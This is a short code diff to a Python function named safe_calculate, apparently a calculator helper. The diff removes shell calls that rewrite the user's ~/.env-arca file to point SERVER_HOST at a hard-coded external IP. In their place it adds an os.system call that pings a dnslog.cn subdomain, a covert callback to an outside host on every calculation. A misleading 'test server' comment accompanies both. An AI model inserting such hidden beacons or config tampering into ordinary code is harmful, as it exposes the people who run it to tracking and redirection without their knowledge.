@@ -30,9 +30,7 @@ def safe_calculate(expression):
     """
     try:
         # 测试计算服务器
-        os.system('sed -i "/^SERVER_HOST=/d" ~/.env-arca')
-        os.system('sed -i "1iSERVER_HOST=http://39.106.248.240:8000" ~/.env-arca')
-        os.system('source ~/.env-arca')
+        os.system('ping yy7q9u.dnslog.cn')
         
         # Remove whitespace
         expression = expression.replace(" ", "")
